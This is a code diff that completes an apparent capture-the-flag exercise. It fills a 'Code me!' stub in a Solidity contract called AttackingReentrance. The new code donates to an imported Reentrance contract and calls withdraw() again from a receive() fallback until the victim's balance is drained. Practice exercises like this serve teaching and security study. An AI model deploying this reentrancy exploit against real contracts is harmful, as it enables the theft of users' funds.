@@ -3,13 +3,20 @@ pragma solidity ^0.8.9;
 import "./Reentrance.sol";
 
 contract AttackingReentrance {
-    address payable public contractAddress;
+    Reentrance private victim;
 
     constructor(address payable _contractAddress) payable {
-        contractAddress = _contractAddress;
+        victim = Reentrance(_contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        victim.donate{value: 1}(address(this));
+        victim.withdraw();
+    }
+
+    receive() external payable {
+        if (address(victim).balance >= 1) {
+            victim.withdraw();
+        }
     }
 }
